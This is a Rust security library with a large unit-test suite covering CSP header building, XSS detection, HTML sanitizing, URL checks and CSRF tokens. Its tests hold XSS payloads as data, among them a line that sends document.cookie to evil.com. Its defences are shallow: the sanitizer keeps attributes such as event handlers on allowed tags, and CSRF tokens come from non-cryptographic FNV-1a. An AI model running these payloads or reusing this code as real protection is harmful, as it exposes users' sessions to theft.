//! ALICE-Browser-Secure — Secure browsing engine
//!
//! CSP生成、XSS検出、URL検証、HTML sanitization

#![no_std]
extern crate alloc;
use alloc::{string::String, vec::Vec};

// ---------------------------------------------------------------------------
// Content Security Policy
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CspDirective {
    pub name: String,
    pub sources: Vec<String>,
}

#[derive(Debug, Clone)]
pub struct ContentSecurityPolicy {
    directives: Vec<CspDirective>,
}

impl ContentSecurityPolicy {
    #[must_use]
    pub const fn new() -> Self {
        Self {
            directives: Vec::new(),
        }
    }

    pub fn add_directive(&mut self, name: &str, sources: &[&str]) {
        self.directives.push(CspDirective {
            name: String::from(name),
            sources: sources.iter().map(|s| String::from(*s)).collect(),
        });
    }

    /// CSPヘッダー文字列を生成
    #[must_use]
    pub fn to_header(&self) -> String {
        let mut parts = Vec::new();
        for d in &self.directives {
            let mut s = d.name.clone();
            for src in &d.sources {
                s.push(' ');
                s.push_str(src);
            }
            parts.push(s);
        }
        let mut result = String::new();
        for (i, part) in parts.iter().enumerate() {
            if i > 0 {
                result.push_str("; ");
            }
            result.push_str(part);
        }
        result
    }

    /// ソースが許可されているかチェック
    #[must_use]
    pub fn allows_source(&self, directive: &str, source: &str) -> bool {
        self.directives
            .iter()
            .find(|d| d.name == directive)
            .is_some_and(|d| d.sources.iter().any(|s| s == source || s == "*"))
    }
}

impl Default for ContentSecurityPolicy {
    fn default() -> Self {
        Self::new()
    }
}

// ---------------------------------------------------------------------------
// XSS Detection
// ---------------------------------------------------------------------------

/// XSS攻撃パターン検出
#[must_use]
pub fn detect_xss(input: &str) -> Vec<XssThreat> {
    let mut threats = Vec::new();
    let lower: Vec<u8> = input
        .bytes()
        .map(|b| if b.is_ascii_uppercase() { b + 32 } else { b })
        .collect();
    let s = core::str::from_utf8(&lower).unwrap_or("");

    if s.contains("<script") {
        threats.push(XssThreat::ScriptTag);
    }
    if s.contains("javascript:") {
        threats.push(XssThreat::JavascriptUri);
    }
    if s.contains("onerror")
        || s.contains("onload")
        || s.contains("onclick")
        || s.contains("onmouseover")
    {
        threats.push(XssThreat::EventHandler);
    }
    if s.contains("eval(") || s.contains("document.cookie") || s.contains("innerhtml") {
        threats.push(XssThreat::DomManipulation);
    }
    threats
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum XssThreat {
    ScriptTag,
    JavascriptUri,
    EventHandler,
    DomManipulation,
}

// ---------------------------------------------------------------------------
// HTML Sanitizer
// ---------------------------------------------------------------------------

/// 危険なHTMLタグを除去
#[must_use]
pub fn sanitize_html(input: &str) -> String {
    let mut result = String::new();
    let mut in_tag = false;
    let mut tag_content = String::new();
    let allowed_tags = [
        "p", "b", "i", "em", "strong", "br", "ul", "ol", "li", "a", "span", "div",
    ];

    for c in input.chars() {
        if c == '<' {
            in_tag = true;
            tag_content.clear();
        } else if c == '>' && in_tag {
            in_tag = false;
            let tag_name = extract_tag_name(&tag_content);
            let is_closing = tag_content.starts_with('/');
            let clean_name = if is_closing {
                &tag_name[1..]
            } else {
                &tag_name
            };
            if allowed_tags.contains(&clean_name) {
                result.push('<');
                result.push_str(&tag_content);
                result.push('>');
            }
        } else if in_tag {
            tag_content.push(c);
        } else {
            result.push(c);
        }
    }
    result
}

fn extract_tag_name(content: &str) -> String {
    let trimmed = content.trim();
    let mut name = String::new();
    for c in trimmed.chars() {
        if c.is_alphanumeric() || c == '/' {
            name.push(c);
        } else {
            break;
        }
    }
    let lower: Vec<u8> = name
        .bytes()
        .map(|b| if b.is_ascii_uppercase() { b + 32 } else { b })
        .collect();
    core::str::from_utf8(&lower).unwrap_or("").into()
}

// ---------------------------------------------------------------------------
// URL Validation
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ParsedUrl {
    pub scheme: String,
    pub host: String,
    pub path: String,
}

/// 簡易URL解析
#[must_use]
pub fn parse_url(url: &str) -> Option<ParsedUrl> {
    let scheme_end = url.find("://")?;
    let scheme = &url[..scheme_end];
    let rest = &url[scheme_end + 3..];
    let host_end = rest.find('/').unwrap_or(rest.len());
    let host = &rest[..host_end];
    let path = if host_end < rest.len() {
        &rest[host_end..]
    } else {
        "/"
    };

    if host.is_empty() {
        return None;
    }

    Some(ParsedUrl {
        scheme: String::from(scheme),
        host: String::from(host),
        path: String::from(path),
    })
}

/// 安全なURL判定
#[must_use]
pub fn is_safe_url(url: &str) -> bool {
    let lower: Vec<u8> = url
        .bytes()
        .take(20)
        .map(|b| if b.is_ascii_uppercase() { b + 32 } else { b })
        .collect();
    let prefix = core::str::from_utf8(&lower).unwrap_or("");
    if prefix.starts_with("javascript:")
        || prefix.starts_with("data:")
        || prefix.starts_with("vbscript:")
    {
        return false;
    }
    if url.contains("..") || url.contains('\0') {
        return false;
    }
    true
}

// ---------------------------------------------------------------------------
// CSRF Token
// ---------------------------------------------------------------------------

/// CSRF トークン生成 (FNV-1a)
#[must_use]
pub fn generate_csrf_token(session_id: &[u8], secret: &[u8], timestamp: u64) -> u64 {
    let mut h: u64 = 14_695_981_039_346_656_037;
    for &b in secret {
        h ^= u64::from(b);
        h = h.wrapping_mul(1_099_511_628_211);
    }
    for &b in session_id {
        h ^= u64::from(b);
        h = h.wrapping_mul(1_099_511_628_211);
    }
    for &b in &timestamp.to_le_bytes() {
        h ^= u64::from(b);
        h = h.wrapping_mul(1_099_511_628_211);
    }
    h
}

#[must_use]
pub fn verify_csrf_token(token: u64, session_id: &[u8], secret: &[u8], timestamp: u64) -> bool {
    generate_csrf_token(session_id, secret, timestamp) == token
}

// ---------------------------------------------------------------------------
// Error
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SecurityError {
    XssDetected,
    CspViolation,
    InvalidUrl,
    CsrfMismatch,
}

impl core::fmt::Display for SecurityError {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        match self {
            Self::XssDetected => write!(f, "xss detected"),
            Self::CspViolation => write!(f, "csp violation"),
            Self::InvalidUrl => write!(f, "invalid url"),
            Self::CsrfMismatch => write!(f, "csrf mismatch"),
        }
    }
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // ===================================================================
    // CSP テスト
    // ===================================================================

    #[test]
    fn csp_header() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("default-src", &["'self'"]);
        csp.add_directive("script-src", &["'self'", "cdn.example.com"]);
        let header = csp.to_header();
        assert!(header.contains("default-src 'self'"));
        assert!(header.contains("script-src 'self' cdn.example.com"));
    }

    #[test]
    fn csp_allows() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("script-src", &["'self'", "cdn.example.com"]);
        assert!(csp.allows_source("script-src", "cdn.example.com"));
        assert!(!csp.allows_source("script-src", "evil.com"));
    }

    /// 空のCSPはヘッダーも空
    #[test]
    fn csp_empty_header() {
        let csp = ContentSecurityPolicy::new();
        assert_eq!(csp.to_header(), "");
    }

    /// Default traitで空CSPが生成される
    #[test]
    fn csp_default() {
        let csp = ContentSecurityPolicy::default();
        assert_eq!(csp.to_header(), "");
    }

    /// ワイルドカード `*` はすべてのソースを許可
    #[test]
    fn csp_wildcard_allows_any() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("img-src", &["*"]);
        assert!(csp.allows_source("img-src", "any-domain.com"));
        assert!(csp.allows_source("img-src", "another.org"));
    }

    /// 存在しないディレクティブはfalseを返す
    #[test]
    fn csp_nonexistent_directive() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("script-src", &["'self'"]);
        assert!(!csp.allows_source("style-src", "'self'"));
    }

    /// 単一ディレクティブのヘッダー出力
    #[test]
    fn csp_single_directive_header() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("default-src", &["'none'"]);
        assert_eq!(csp.to_header(), "default-src 'none'");
    }

    /// 3つ以上のディレクティブがセミコロン区切りで出力
    #[test]
    fn csp_three_directives() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("default-src", &["'self'"]);
        csp.add_directive("script-src", &["cdn.example.com"]);
        csp.add_directive("style-src", &["'unsafe-inline'"]);
        let header = csp.to_header();
        // セミコロンで3つに分割される
        assert_eq!(header.split("; ").count(), 3);
    }

    /// ソースなしのディレクティブ
    #[test]
    fn csp_directive_no_sources() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("upgrade-insecure-requests", &[]);
        assert_eq!(csp.to_header(), "upgrade-insecure-requests");
    }

    /// 複数ソースを持つディレクティブ
    #[test]
    fn csp_multiple_sources() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive(
            "font-src",
            &["'self'", "fonts.gstatic.com", "cdn.example.com"],
        );
        let header = csp.to_header();
        assert!(header.contains("font-src 'self' fonts.gstatic.com cdn.example.com"));
    }

    /// 同名ディレクティブを複数追加した場合、最初のマッチで判定
    #[test]
    fn csp_duplicate_directive_name() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("script-src", &["a.com"]);
        csp.add_directive("script-src", &["b.com"]);
        // allows_sourceは最初のマッチを使う（find）
        assert!(csp.allows_source("script-src", "a.com"));
        assert!(!csp.allows_source("script-src", "b.com"));
    }

    /// CSPの `Clone`
    #[test]
    fn csp_clone() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("default-src", &["'self'"]);
        let cloned = csp.clone();
        assert_eq!(csp.to_header(), cloned.to_header());
    }

    /// `CspDirective` の `PartialEq` と `Debug`
    #[test]
    fn csp_directive_eq_and_debug() {
        let d1 = CspDirective {
            name: String::from("script-src"),
            sources: alloc::vec![String::from("'self'")],
        };
        let d2 = d1.clone();
        assert_eq!(d1, d2);
        let debug = alloc::format!("{d1:?}");
        assert!(debug.contains("script-src"));
    }

    /// 空ソースへの `allows_source` は false
    #[test]
    fn csp_allows_empty_sources() {
        let mut csp = ContentSecurityPolicy::new();
        csp.add_directive("img-src", &[]);
        assert!(!csp.allows_source("img-src", "'self'"));
    }

    // ===================================================================
    // XSS 検出テスト
    // ===================================================================

    #[test]
    fn xss_script_tag() {
        let threats = detect_xss("<script>alert(1)</script>");
        assert!(threats.contains(&XssThreat::ScriptTag));
    }

    #[test]
    fn xss_event_handler() {
        let threats = detect_xss("<img onerror='alert(1)' src='x'>");
        assert!(threats.contains(&XssThreat::EventHandler));
    }

    #[test]
    fn xss_javascript_uri() {
        let threats = detect_xss("javascript:void(0)");
        assert!(threats.contains(&XssThreat::JavascriptUri));
    }

    #[test]
    fn xss_clean() {
        let threats = detect_xss("Hello, world!");
        assert!(threats.is_empty());
    }

    /// 大文字混合の<SCRIPT>も検出
    #[test]
    fn xss_script_tag_uppercase() {
        let threats = detect_xss("<SCRIPT>alert(1)</SCRIPT>");
        assert!(threats.contains(&XssThreat::ScriptTag));
    }

    /// 大文字混合の `JaVaScRiPt` URI も検出
    #[test]
    fn xss_javascript_uri_mixed_case() {
        let threats = detect_xss("JaVaScRiPt:alert(1)");
        assert!(threats.contains(&XssThreat::JavascriptUri));
    }

    /// onclick イベントハンドラ検出
    #[test]
    fn xss_onclick_handler() {
        let threats = detect_xss("<div onclick='steal()'>click</div>");
        assert!(threats.contains(&XssThreat::EventHandler));
    }

    /// onload イベントハンドラ検出
    #[test]
    fn xss_onload_handler() {
        let threats = detect_xss("<body onload='init()'>");
        assert!(threats.contains(&XssThreat::EventHandler));
    }

    /// onmouseover イベントハンドラ検出
    #[test]
    fn xss_onmouseover_handler() {
        let threats = detect_xss("<a onmouseover='attack()'>hover</a>");
        assert!(threats.contains(&XssThreat::EventHandler));
    }

    /// `eval()` はDOM操作として検出
    #[test]
    fn xss_eval() {
        let threats = detect_xss("eval('malicious code')");
        assert!(threats.contains(&XssThreat::DomManipulation));
    }

    /// document.cookie はDOM操作として検出
    #[test]
    fn xss_document_cookie() {
        let threats = detect_xss("new Image().src='http://evil.com?c='+document.cookie");
        assert!(threats.contains(&XssThreat::DomManipulation));
    }

    /// innerHTML はDOM操作として検出
    #[test]
    fn xss_innerhtml() {
        let threats = detect_xss("element.innerHTML = userInput");
        assert!(threats.contains(&XssThreat::DomManipulation));
    }

    /// innerHTML 大文字混合
    #[test]
    fn xss_innerhtml_mixed_case() {
        let threats = detect_xss("element.InnerHTML = data");
        assert!(threats.contains(&XssThreat::DomManipulation));
    }

    /// 複数の脅威が同時に検出される
    #[test]
    fn xss_multiple_threats() {
        let threats = detect_xss("<script>eval(document.cookie)</script>");
        assert!(threats.contains(&XssThreat::ScriptTag));
        assert!(threats.contains(&XssThreat::DomManipulation));
        assert!(threats.len() >= 2);
    }

    /// スクリプトタグ + `JavascriptUri` 同時検出
    #[test]
    fn xss_script_and_javascript_uri() {
        let threats = detect_xss("<script>javascript:alert(1)</script>");
        assert!(threats.contains(&XssThreat::ScriptTag));
        assert!(threats.contains(&XssThreat::JavascriptUri));
    }

    /// 空文字列は脅威なし
    #[test]
    fn xss_empty_input() {
        let threats = detect_xss("");
        assert!(threats.is_empty());
    }

    /// 通常のHTMLは脅威なし
    #[test]
    fn xss_normal_html() {
        let threats = detect_xss("<p>Hello <b>World</b></p>");
        assert!(threats.is_empty());
    }

    /// scriptを含むがタグではない文字列
    #[test]
    fn xss_script_in_text_not_tag() {
        // "script" がテキスト中にあるがタグではない
        let threats = detect_xss("This is a description about scripts");
        assert!(threats.is_empty());
    }

    /// onerrorを含む文字列は検出される（この実装の仕様）
    #[test]
    fn xss_onerror_in_attribute_value() {
        let threats = detect_xss("class='onerror-handler'");
        assert!(threats.contains(&XssThreat::EventHandler));
    }

    /// `XssThreat` の `Clone` と `Debug`
    #[test]
    fn xss_threat_clone_debug() {
        let t = XssThreat::ScriptTag;
        let t2 = t.clone();
        assert_eq!(t, t2);
        let debug = alloc::format!("{t:?}");
        assert!(debug.contains("ScriptTag"));
    }

    /// 全4種の `XssThreat` の `PartialEq`
    #[test]
    fn xss_threat_variants_ne() {
        assert_ne!(XssThreat::ScriptTag, XssThreat::JavascriptUri);
        assert_ne!(XssThreat::EventHandler, XssThreat::DomManipulation);
        assert_ne!(XssThreat::ScriptTag, XssThreat::EventHandler);
        assert_ne!(XssThreat::JavascriptUri, XssThreat::DomManipulation);
    }

    // ===================================================================
    // HTML Sanitize テスト
    // ===================================================================

    #[test]
    fn sanitize_removes_script() {
        let result = sanitize_html("Hello <script>alert(1)</script> World");
        assert!(!result.contains("script"));
        assert!(result.contains("Hello"));
        assert!(result.contains("World"));
    }

    #[test]
    fn sanitize_keeps_safe() {
        let result = sanitize_html("<p>Hello <b>World</b></p>");
        assert!(result.contains("<p>"));
        assert!(result.contains("<b>"));
    }

    /// 空文字列の入力
    #[test]
    fn sanitize_empty_input() {
        assert_eq!(sanitize_html(""), "");
    }

    /// タグなしのテキスト
    #[test]
    fn sanitize_plain_text() {
        assert_eq!(sanitize_html("Hello World"), "Hello World");
    }

    /// em タグは許可
    #[test]
    fn sanitize_keeps_em() {
        let result = sanitize_html("<em>emphasis</em>");
        assert!(result.contains("<em>"));
        assert!(result.contains("</em>"));
    }

    /// strong タグは許可
    #[test]
    fn sanitize_keeps_strong() {
        let result = sanitize_html("<strong>bold</strong>");
        assert!(result.contains("<strong>"));
        assert!(result.contains("</strong>"));
    }

    /// i タグは許可
    #[test]
    fn sanitize_keeps_i() {
        let result = sanitize_html("<i>italic</i>");
        assert!(result.contains("<i>"));
    }

    /// br タグは許可
    #[test]
    fn sanitize_keeps_br() {
        let result = sanitize_html("line1<br>line2");
        assert!(result.contains("<br>"));
    }

    /// ul/ol/li タグは許可
    #[test]
    fn sanitize_keeps_list_tags() {
        let result = sanitize_html("<ul><li>item1</li><li>item2</li></ul>");
        assert!(result.contains("<ul>"));
        assert!(result.contains("<li>"));
        assert!(result.contains("</li>"));
        assert!(result.contains("</ul>"));
    }

    /// ol タグは許可
    #[test]
    fn sanitize_keeps_ol() {
        let result = sanitize_html("<ol><li>first</li></ol>");
        assert!(result.contains("<ol>"));
    }

    /// a タグは許可
    #[test]
    fn sanitize_keeps_a() {
        let result = sanitize_html("<a href='https://example.com'>link</a>");
        assert!(result.contains("<a"));
        assert!(result.contains("</a>"));
    }

    /// span タグは許可
    #[test]
    fn sanitize_keeps_span() {
        let result = sanitize_html("<span class='x'>text</span>");
        assert!(result.contains("<span"));
        assert!(result.contains("</span>"));
    }

    /// div タグは許可
    #[test]
    fn sanitize_keeps_div() {
        let result = sanitize_html("<div>content</div>");
        assert!(result.contains("<div>"));
        assert!(result.contains("</div>"));
    }

    /// iframe タグは除去
    #[test]
    fn sanitize_removes_iframe() {
        let result = sanitize_html("<iframe src='evil.com'></iframe>");
        assert!(!result.contains("iframe"));
    }

    /// img タグは除去
    #[test]
    fn sanitize_removes_img() {
        let result = sanitize_html("<img src='photo.jpg'>");
        assert!(!result.contains("img"));
    }

    /// style タグは除去
    #[test]
    fn sanitize_removes_style() {
        #[allow(clippy::literal_string_with_formatting_args)]
        let result = sanitize_html("<style>body{display:none}</style>");
        assert!(!result.contains("style"));
    }

    /// form タグは除去
    #[test]
    fn sanitize_removes_form() {
        let result = sanitize_html("<form action='evil.com'><input type='text'></form>");
        assert!(!result.contains("form"));
        assert!(!result.contains("input"));
    }

    /// ネストしたタグの混合
    #[test]
    fn sanitize_nested_mixed() {
        let result = sanitize_html("<div><script>bad()</script><p>safe</p></div>");
        assert!(result.contains("<div>"));
        assert!(result.contains("<p>"));
        assert!(!result.contains("script"));
    }

    /// 大文字タグも除去される (SCRIPTタグ)
    #[test]
    fn sanitize_uppercase_script() {
        let result = sanitize_html("<SCRIPT>alert(1)</SCRIPT>");
        assert!(!result.contains("SCRIPT"));
        assert!(!result.contains("script"));
    }

    /// テキストのみ（タグ構造が不完全）
    #[test]
    fn sanitize_incomplete_tag() {
        let result = sanitize_html("text < not a tag > more");
        // '<' のあと ' not a tag ' がタグとして処理されるが許可外なので除去
        assert!(result.contains("text "));
        assert!(result.contains(" more"));
    }

    /// 大文字の許可タグも通す
    #[test]
    fn sanitize_uppercase_allowed_tag() {
        let result = sanitize_html("<P>paragraph</P>");
        assert!(result.contains("<P>"));
        assert!(result.contains("</P>"));
    }

    // ===================================================================
    // URL 解析テスト
    // ===================================================================

    #[test]
    fn parse_url_basic() {
        let url = parse_url("https://example.com/path").unwrap();
        assert_eq!(url.scheme, "https");
        assert_eq!(url.host, "example.com");
        assert_eq!(url.path, "/path");
    }

    /// パスなしのURL
    #[test]
    fn parse_url_no_path() {
        let url = parse_url("https://example.com").unwrap();
        assert_eq!(url.scheme, "https");
        assert_eq!(url.host, "example.com");
        assert_eq!(url.path, "/");
    }

    /// http スキーム
    #[test]
    fn parse_url_http() {
        let url = parse_url("http://example.com/page").unwrap();
        assert_eq!(url.scheme, "http");
        assert_eq!(url.host, "example.com");
        assert_eq!(url.path, "/page");
    }

    /// ftp スキーム
    #[test]
    fn parse_url_ftp() {
        let url = parse_url("ftp://files.example.com/data").unwrap();
        assert_eq!(url.scheme, "ftp");
        assert_eq!(url.host, "files.example.com");
    }

    /// ポート付きURL
    #[test]
    fn parse_url_with_port() {
        let url = parse_url("https://example.com:8080/api").unwrap();
        assert_eq!(url.host, "example.com:8080");
        assert_eq!(url.path, "/api");
    }

    /// 深いパス
    #[test]
    fn parse_url_deep_path() {
        let url = parse_url("https://example.com/a/b/c/d").unwrap();
        assert_eq!(url.path, "/a/b/c/d");
    }

    /// クエリ文字列付き（パスに含まれる）
    #[test]
    fn parse_url_with_query() {
        let url = parse_url("https://example.com/search?q=test").unwrap();
        assert!(url.path.contains("?q=test"));
    }

    /// フラグメント付き
    #[test]
    fn parse_url_with_fragment() {
        let url = parse_url("https://example.com/page#section").unwrap();
        assert!(url.path.contains("#section"));
    }

    /// スキームなし（://がない）はNone
    #[test]
    fn parse_url_no_scheme() {
        assert!(parse_url("example.com/path").is_none());
    }

    /// 空ホストはNone
    #[test]
    fn parse_url_empty_host() {
        assert!(parse_url("https:///path").is_none());
    }

    /// 完全に空の文字列はNone
    #[test]
    fn parse_url_empty_string() {
        assert!(parse_url("").is_none());
    }

    /// スキームのみ
    #[test]
    fn parse_url_scheme_only() {
        assert!(parse_url("https://").is_none());
    }

    /// `ParsedUrl` の `Clone` と `PartialEq`
    #[test]
    fn parsed_url_clone_eq() {
        let url = parse_url("https://example.com/path").unwrap();
        let url2 = url.clone();
        assert_eq!(url, url2);
    }

    /// `ParsedUrl` のDebug
    #[test]
    fn parsed_url_debug() {
        let url = parse_url("https://example.com/test").unwrap();
        let debug = alloc::format!("{url:?}");
        assert!(debug.contains("https"));
        assert!(debug.contains("example.com"));
    }

    /// 異なるURLは不等
    #[test]
    fn parsed_url_ne() {
        let url1 = parse_url("https://a.com/x").unwrap();
        let url2 = parse_url("https://b.com/y").unwrap();
        assert_ne!(url1, url2);
    }

    // ===================================================================
    // URL 安全性テスト
    // ===================================================================

    #[test]
    fn is_safe_url_check() {
        assert!(is_safe_url("https://example.com"));
        assert!(!is_safe_url("javascript:alert(1)"));
        assert!(!is_safe_url("data:text/html,<script>"));
    }

    /// vbscript は危険
    #[test]
    fn is_safe_url_vbscript() {
        assert!(!is_safe_url("vbscript:MsgBox"));
    }

    /// 大文字混合の javascript
    #[test]
    fn is_safe_url_javascript_upper() {
        assert!(!is_safe_url("JAVASCRIPT:alert(1)"));
    }

    /// 大文字混合の data
    #[test]
    fn is_safe_url_data_upper() {
        assert!(!is_safe_url("DATA:text/html,<h1>hi</h1>"));
    }

    /// nullバイトは危険
    #[test]
    fn is_safe_url_null_byte() {
        assert!(!is_safe_url("https://example.com/path\0injected"));
    }

    /// パストラバーサルは危険
    #[test]
    fn is_safe_url_path_traversal() {
        assert!(!is_safe_url("https://example.com/../../etc/passwd"));
    }

    /// 通常のhttp URLは安全
    #[test]
    fn is_safe_url_http() {
        assert!(is_safe_url("http://example.com/page"));
    }

    /// 通常のftp URLは安全
    #[test]
    fn is_safe_url_ftp() {
        assert!(is_safe_url("ftp://files.example.com/data.zip"));
    }

    /// 空文字列は安全（禁止パターンに該当しない）
    #[test]
    fn is_safe_url_empty() {
        assert!(is_safe_url(""));
    }

    /// 相対パスは安全
    #[test]
    fn is_safe_url_relative() {
        assert!(is_safe_url("/path/to/page"));
    }

    /// VBSCRIPTも大文字で検出
    #[test]
    fn is_safe_url_vbscript_upper() {
        assert!(!is_safe_url("VBSCRIPT:Execute"));
    }

    // ===================================================================
    // CSRF テスト
    // ===================================================================

    #[test]
    fn csrf_token_verify() {
        let token = generate_csrf_token(b"session123", b"secret", 1000);
        assert!(verify_csrf_token(token, b"session123", b"secret", 1000));
        assert!(!verify_csrf_token(token, b"session123", b"secret", 1001));
    }

    #[test]
    fn csrf_token_deterministic() {
        let t1 = generate_csrf_token(b"s", b"k", 42);
        let t2 = generate_csrf_token(b"s", b"k", 42);
        assert_eq!(t1, t2);
    }

    /// 異なるセッションIDで異なるトークン
    #[test]
    fn csrf_different_session() {
        let t1 = generate_csrf_token(b"session_a", b"secret", 100);
        let t2 = generate_csrf_token(b"session_b", b"secret", 100);
        assert_ne!(t1, t2);
    }

    /// 異なるシークレットで異なるトークン
    #[test]
    fn csrf_different_secret() {
        let t1 = generate_csrf_token(b"session", b"secret1", 100);
        let t2 = generate_csrf_token(b"session", b"secret2", 100);
        assert_ne!(t1, t2);
    }

    /// 異なるタイムスタンプで異なるトークン
    #[test]
    fn csrf_different_timestamp() {
        let t1 = generate_csrf_token(b"session", b"secret", 1);
        let t2 = generate_csrf_token(b"session", b"secret", 2);
        assert_ne!(t1, t2);
    }

    /// 空のセッションID
    #[test]
    fn csrf_empty_session() {
        let token = generate_csrf_token(b"", b"secret", 100);
        assert!(verify_csrf_token(token, b"", b"secret", 100));
    }

    /// 空のシークレット
    #[test]
    fn csrf_empty_secret() {
        let token = generate_csrf_token(b"session", b"", 100);
        assert!(verify_csrf_token(token, b"session", b"", 100));
    }

    /// 両方空
    #[test]
    fn csrf_all_empty() {
        let token = generate_csrf_token(b"", b"", 0);
        assert!(verify_csrf_token(token, b"", b"", 0));
    }

    /// タイムスタンプ最大値
    #[test]
    fn csrf_max_timestamp() {
        let token = generate_csrf_token(b"s", b"k", u64::MAX);
        assert!(verify_csrf_token(token, b"s", b"k", u64::MAX));
    }

    /// 不正トークンの検証失敗
    #[test]
    fn csrf_wrong_token() {
        assert!(!verify_csrf_token(0, b"session", b"secret", 100));
        assert!(!verify_csrf_token(u64::MAX, b"session", b"secret", 100));
    }

    /// 長いセッションIDとシークレット
    #[test]
    fn csrf_long_inputs() {
        let long_session = [0xABu8; 256];
        let long_secret = [0xCDu8; 512];
        let token = generate_csrf_token(&long_session, &long_secret, 999);
        assert!(verify_csrf_token(token, &long_session, &long_secret, 999));
    }

    // ===================================================================
    // SecurityError テスト
    // ===================================================================

    /// `XssDetected` の `Display`
    #[test]
    fn error_display_xss() {
        let e = SecurityError::XssDetected;
        assert_eq!(alloc::format!("{e}"), "xss detected");
    }

    /// `CspViolation` の `Display`
    #[test]
    fn error_display_csp() {
        let e = SecurityError::CspViolation;
        assert_eq!(alloc::format!("{e}"), "csp violation");
    }

    /// `InvalidUrl` の `Display`
    #[test]
    fn error_display_url() {
        let e = SecurityError::InvalidUrl;
        assert_eq!(alloc::format!("{e}"), "invalid url");
    }

    /// `CsrfMismatch` の `Display`
    #[test]
    fn error_display_csrf() {
        let e = SecurityError::CsrfMismatch;
        assert_eq!(alloc::format!("{e}"), "csrf mismatch");
    }

    /// `SecurityError` の `Clone` と `PartialEq`
    #[test]
    fn error_clone_eq() {
        let e1 = SecurityError::XssDetected;
        let e2 = e1.clone();
        assert_eq!(e1, e2);
    }

    /// `SecurityError` の各バリアントは互いに不等
    #[test]
    fn error_variants_ne() {
        assert_ne!(SecurityError::XssDetected, SecurityError::CspViolation);
        assert_ne!(SecurityError::InvalidUrl, SecurityError::CsrfMismatch);
    }

    /// `SecurityError` の `Debug`
    #[test]
    fn error_debug() {
        let debug = alloc::format!("{:?}", SecurityError::XssDetected);
        assert!(debug.contains("XssDetected"));
    }
}
